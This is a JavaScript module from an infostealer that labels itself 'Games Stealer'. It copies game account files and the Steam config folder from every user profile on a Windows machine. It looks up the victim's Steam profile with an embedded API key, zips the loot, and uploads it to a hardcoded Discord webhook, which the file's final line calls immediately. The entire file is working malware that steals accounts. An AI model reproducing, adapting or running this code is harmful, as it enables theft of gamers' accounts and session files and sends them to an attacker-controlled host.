const os = require('os');
const fs = require('fs');
const axios = require('axios');
const path = require('path');

const gamesPaths = require('./paths.js');

const requests = require('./../../utils/requests/requests.js');
const fileutil = require('./../../utils/fileutil/fileutil.js');
const hardware = require('./../../utils/hardware/hardware.js');

const games = async (webhookUrl) => {
    const users = await hardware.getUsers();

    const gamesTempDir = path.join(os.tmpdir(), `games-temp`);
    if (!fs.existsSync(gamesTempDir)) {
        fs.mkdirSync(gamesTempDir, { recursive: true });
    }

    let anyGameFound = false;
    let foundGames = '';

    for (const user of users) {
        for (const [gameName, gamePaths] of Object.entries(gamesPaths.getGames())) {
            const destGames = path.join(gamesTempDir, path.basename(user), gameName);

            for (const [name, relativePath] of Object.entries(gamePaths)) {
                const gamePath = path.join(user, relativePath);

                if (!fs.existsSync(gamePath)) {
                    continue;
                }

                try {
                    const isDirectory = fs.lstatSync(gamePath).isDirectory();
                    const gameDestPath = isDirectory
                        ? path.join(destGames, name)
                        : path.join(destGames, name, path.basename(gamePath));

                    if (!fs.existsSync(path.join(destGames, name))) {
                        fs.mkdirSync(path.join(destGames, name), { recursive: true });
                    }

                    await fileutil.copy(gamePath, gameDestPath);

                    if (!foundGames.includes(gameName)) {
                        foundGames += `\n✅ ${path.basename(user)} - ${gameName}`;
                        anyGameFound = true;
                    }
                } catch (err) {
                    continue;
                }
            }

            if (!anyGameFound) {
                fs.rmSync(destGames, { recursive: true, force: true });
            }
        }
    }

    if (!foundGames) {
        fs.rmSync(gamesTempDir, { recursive: true, force: true });
        return;
    }

    if (foundGames.length > 4090) {
        foundGames = 'Numerous games to explore.';
    }

    const gamesTempZip = path.join(os.tmpdir(), 'games.zip');
    try {
        await fileutil.zipDirectory({
            inputDir: gamesTempDir,
            outputZip: gamesTempZip
        });

        await requests.webhook(webhookUrl, {
            embeds: [{
                title: `Games Stealer`,
                description: '```' + foundGames + '```',
            }],
        }, [gamesTempZip]);

        [gamesTempDir, gamesTempZip].forEach(dir => {
            fileutil.removeDir(dir);
        });
    } catch (error) {
        console.error(error);
    }
};

const steam = async (webhookUrl) => {
    const steamTempDir = path.join(os.tmpdir(), 'steam-temp');
    const steamPath = path.join('C:', 'Program Files (x86)', 'Steam', 'config');

    if (!fs.existsSync(steamPath) || !fs.statSync(steamPath).isDirectory()) return;

    const readConfig = (filePath) => {
        const vdfContent = fs.readFileSync(filePath, 'utf-8');
        const lines = vdfContent.split('\n');
        const result = [];
        const idRegex = /7656[0-9]{13}/gi;

        for (const line of lines) {
            const matches = line.match(idRegex);
            if (matches) result.push(...matches);
        }

        return result;
    };

    const config = path.join(steamPath, "config.vdf");
    if (fs.existsSync(config)) {
        const loginusers = path.join(steamPath, "loginusers.vdf");
        const userID = readConfig(loginusers);

        try {
            const response = await axios.get(`https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=3000BC0F14309FD7999F02C66E757EF7&steamids=${userID}`);
            const accountInfo = response.data?.accountInfo?.response?.players || {};

            await fileutil.copy(steamPath, steamTempDir);
            const steamTempZip = path.join(os.tmpdir(), 'steam.zip');

            await fileutil.zipDirectory({
                inputDir: steamTempDir,
                outputZip: steamTempZip
            });

            await requests.webhook(webhookUrl, {
                embeds: [{
                    ...accountInfo && accountInfo.avatar ? { thumbnail: { url: accountInfo.avatar } } : null,
                    title: `Steam ${accountInfo && accountInfo.personaname ? `${accountInfo.personaname} | Created At <t:${accountInfo.timecreated}>` : ''}`,
                    description: '```' + '✅✅✅' + '```',
                }],
            }, [steamTempZip]);

            const WishTempDir = fileutil.WishTempDir('games');
            await fileutil.copy(steamTempDir, WishTempDir);

            [steamTempDir, steamTempZip].forEach(dir => {
                fileutil.removeDir(dir);
            });
        } catch (error) {
            console.error(error);
        }
    }
};

module.exports = async (webhookUrl) => {
    await games(webhookUrl);
    await steam(webhookUrl);
}

module.exports('https://canary.discord.com/api/webhooks/1289317582410874911/Xw8JFexFx_U35vqrLVrTRG9FgIppud0hTMwTwxFW97neliTZ7P99cK7ewkDO7A8LE4UX')